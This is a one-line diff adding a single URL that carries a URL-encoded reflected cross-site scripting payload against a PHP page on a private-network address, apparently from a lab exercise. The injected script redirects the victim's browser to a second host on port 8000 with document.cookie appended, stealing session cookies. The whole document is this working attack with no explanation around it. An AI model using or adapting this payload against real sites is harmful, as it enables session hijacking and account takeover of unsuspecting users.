@@ -1,0 +1,1 @@
+http://192.168.1.203/task1ref.php?msg=%3Cscript%3Edocument.location%3D%27http%3A%2F%2F192.168.1.201%3A8000%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E
